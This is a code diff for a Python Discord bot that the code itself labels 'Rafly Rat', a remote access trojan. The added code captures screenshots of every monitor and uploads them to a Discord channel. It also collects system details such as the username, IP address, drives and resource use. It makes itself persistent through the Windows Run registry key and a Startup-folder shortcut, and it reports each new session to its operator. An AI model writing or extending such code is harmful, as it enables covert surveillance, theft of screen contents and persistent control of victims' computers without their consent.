@@ -14,6 +14,15 @@ import json
 import uuid
 import subprocess
 import pyautogui
+import psutil
+import GPUtil
+from screeninfo import get_monitors
+import mss
+import pythoncom
+from win32com.client import Dispatch
+import winreg as reg
+
+Version = "0.0.4"
 
 # Configuration file path
 CONFIG_FILE_PATH = 'config.json'
@@ -91,10 +100,58 @@ async def handle_status_command(message):
   # Check if the bot is running with admin privileges
   is_admin = os.getuid() == 0 if os.name != 'nt' else os.system("net session >nul 2>&1") == 0
 
-  # Create the status message
-  status_message = f"Bot is running and ready to assist!\nAdmin Privileges: {'Yes' if is_admin else 'No'}"
+  # Get system usage statistics
+  cpu_usage = psutil.cpu_percent(interval=1)
+  ram_usage = psutil.virtual_memory().percent
 
-  await message.channel.send(status_message)
+  # Get GPU usage
+  gpus = GPUtil.getGPUs()
+  if gpus:
+    gpu_usage = f"{gpus[0].load * 100:.2f}%"
+  else:
+    gpu_usage = "N/A"
+
+  # Create the status embed message
+  embed = discord.Embed(title="Status", color=0x00ff00)
+
+  # Add PC status
+  embed.add_field(name="CPU Usage", value=f"```{cpu_usage}%```", inline=True)
+  embed.add_field(name="RAM Usage", value=f"```{ram_usage}%```", inline=True)
+  embed.add_field(name="GPU Usage", value=f"```{gpu_usage}```", inline=True)
+
+  # Get drive usage for all drives
+  drives = psutil.disk_partitions()
+  for drive in drives:
+    if os.name == 'nt':
+      if 'cdrom' in drive.opts or drive.fstype == '':
+        continue
+    drive_usage = psutil.disk_usage(drive.mountpoint)
+    total_drive = drive_usage.total / (1024 ** 3)  # Convert bytes to GB
+    free_drive = drive_usage.free / (1024 ** 3)  # Convert bytes to GB
+    drive_usage_percent = drive_usage.percent
+
+    # Create a bar to represent drive usage
+    bar_length = 20
+    filled_length = int(bar_length * drive_usage_percent // 100)
+    bar = '█' * filled_length + '-' * (bar_length - filled_length)
+
+    embed.add_field(
+      name=f"{drive.device} Usage",
+      value=f"`[{bar}]`\n```{free_drive:.2f} GB free of {total_drive:.2f} GB```",
+      inline=False
+    )
+
+  # Add Bot status
+  embed.add_field(name="Admin Privileges", value=f"```{'Yes' if is_admin else 'No'}```", inline=True)
+  embed.add_field(name="User", value=f"```{getpass.getuser()}```", inline=True)
+  embed.add_field(name="Uptime", value=f"```{time.strftime('%H:%M:%S', time.gmtime(time.time() - psutil.boot_time()))}```", inline=False)
+  embed.add_field(name="Version", value=f"```{Version}```", inline=True)
+
+  # Check for any errors (this is a placeholder, you can add your own error checks)
+  errors = "No errors detected."
+  embed.add_field(name="Errors", value=f"```{errors}```", inline=False)
+
+  await message.channel.send(embed=embed)
 
 async def handle_help_command(message):
   """Handles the help command."""
@@ -191,9 +248,28 @@ def take_screenshot():
     screenshot.save('screenshot.png')
 
 async def handle_screenshot_command(message):
-    """Handles the screenshot command."""
-    take_screenshot()
-    await message.channel.send(file=discord.File('screenshot.png'))
+  """Handles the screenshot command."""
+  try:
+    # Take screenshots of all monitors
+    files = []
+    with mss.mss() as sct:
+      for i, monitor in enumerate(sct.monitors[1:], start=1):  # Skip the first entry which is a virtual monitor
+        screenshot = sct.grab(monitor)
+        screenshot_path = f'screenshot_monitor_{i}.png'
+        mss.tools.to_png(screenshot.rgb, screenshot.size, output=screenshot_path)
+        files.append((screenshot_path, discord.File(screenshot_path, filename=screenshot_path)))
+
+    # Send each screenshot as an embedded image
+    for screenshot_path, file in files:
+      embed = discord.Embed(title=f"Screenshot - Monitor {files.index((screenshot_path, file)) + 1}", color=0x00ff00)
+      embed.set_image(url=f"attachment://{screenshot_path}")
+      await message.channel.send(file=file, embed=embed)
+
+      # Remove the screenshot file after sending
+      os.remove(screenshot_path)
+  except Exception as e:
+    await message.channel.send(f"An error occurred while taking screenshots: {e}")
+    print(f"Error in handle_screenshot_command: {e}")
 
 def uac():
     """Request admin privileges using UAC."""
@@ -248,17 +324,101 @@ async def handle_exit_command(message):
   await message.channel.send('Shutting down...')
   await client.close()
 
+def add_to_taskmanager_startup():
+    """Add the script to the Task Manager startup."""
+    script_path = os.path.abspath(__file__)
+    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    value_name = "RaflyBot"
+
+    try:
+        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
+        reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, script_path)
+        reg.CloseKey(reg_key)
+        print(f"Successfully added to startup: {key}\\{value_name} -> {script_path}")
+    except Exception as e:
+        print(f"Failed to add to startup: {e}")
+
+async def handle_add_to_taskmanager_startup_command(message):
+  """Handles the add to Task Manager startup command."""
+  add_to_taskmanager_startup()
+  await message.channel.send("Successfully added to Task Manager startup.")
+
+def add_to_startup_folder():
+  """Add the script to the Windows startup folder."""
+  startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+  script_path = os.path.abspath(__file__)
+  shortcut_path = os.path.join(startup_folder, 'RaflyBot.lnk')
+
+  try:
+    shell = Dispatch('WScript.Shell')
+    shortcut = shell.CreateShortCut(shortcut_path)
+    shortcut.TargetPath = script_path
+    shortcut.WorkingDirectory = os.path.dirname(script_path)
+    shortcut.save()
+    print("Successfully added to startup folder.")
+  except Exception as e:
+    print(f"Failed to add to startup folder: {e}")
+
+async def handle_add_to_startup_folder_command(message):
+  """Handles the add to startup folder command."""
+  add_to_startup_folder()
+  await message.channel.send("Successfully added to startup folder.")
+
+def remove_from_taskmanager_startup():
+    """Remove the script from the Task Manager startup."""
+    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    value_name = "RaflyBot"
+
+    try:
+        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
+        reg.DeleteValue(reg_key, value_name)
+        reg.CloseKey(reg_key)
+        print("Successfully removed from Task Manager startup.")
+    except FileNotFoundError:
+        print("The registry key does not exist.")
+    except Exception as e:
+        print(f"Failed to remove from Task Manager startup: {e}")
+
+async def handle_remove_from_taskmanager_startup_command(message):
+  """Handles the remove from Task Manager startup command."""
+  remove_from_taskmanager_startup()
+  await message.channel.send("Successfully removed from Task Manager startup.")
+
+def remove_from_startup_folder():
+  """Remove the script from the Windows startup folder."""
+  startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+  shortcut_path = os.path.join(startup_folder, 'RaflyBot.lnk')
+
+  try:
+    if os.path.exists(shortcut_path):
+      os.remove(shortcut_path)
+      print("Successfully removed from startup folder.")
+    else:
+      print("Shortcut not found in startup folder.")
+  except Exception as e:
+    print(f"Failed to remove from startup folder: {e}")
+
+async def handle_remove_from_startup_folder_command(message):
+  """Handles the remove from startup folder command."""
+  remove_from_startup_folder()
+  await message.channel.send("Successfully removed from startup folder.")
+
 # Dictionary to map commands to their corresponding handler functions
 command_handlers = {
-  'hello': handle_hello_command,
-  'status': handle_status_command,
-  'help': handle_help_command,
-  'update client': handle_update_command,
-  'message box': handle_message_box_command,
-  'screenshot': handle_screenshot_command,
-  'uac': handle_uac_command,
-  'restart bot': handle_restart_command,
-  'exit': handle_exit_command,
+    'hello': handle_hello_command,
+    'status': handle_status_command,
+    'add to taskmanager startup': handle_add_to_taskmanager_startup_command,
+    'add to startup folder': handle_add_to_startup_folder_command,
+    'remove from taskmanager startup': handle_remove_from_taskmanager_startup_command,
+    'remove from startup folder': handle_remove_from_startup_folder_command,
+    'help': handle_help_command,
+    'update client': handle_update_command,
+    'message box': handle_message_box_command,
+    'screenshot': handle_screenshot_command,
+    'uac': handle_uac_command,
+    'restart bot': handle_restart_command,
+    'rb': handle_restart_command,
+    'exit': handle_exit_command,
 }
 
 def check_existing_session():
@@ -280,7 +440,11 @@ async def on_ready():
 
   # Check for an existing session
   if check_existing_session():
-    await channel.send("Session online")
+    embed = discord.Embed(title=f"Rafly Rat V: {Version}", color=0x00ff00)
+    embed.add_field(name="Status", value="Session online", inline=False)
+    embed.add_field(name="User", value=getpass.getuser(), inline=False)
+    embed.add_field(name="IP Address", value=socket.gethostbyname(socket.gethostname()), inline=False)
+    await channel.send(embed=embed)
   else:
     # Send the session message to the channel
     await send_session_message(channel)
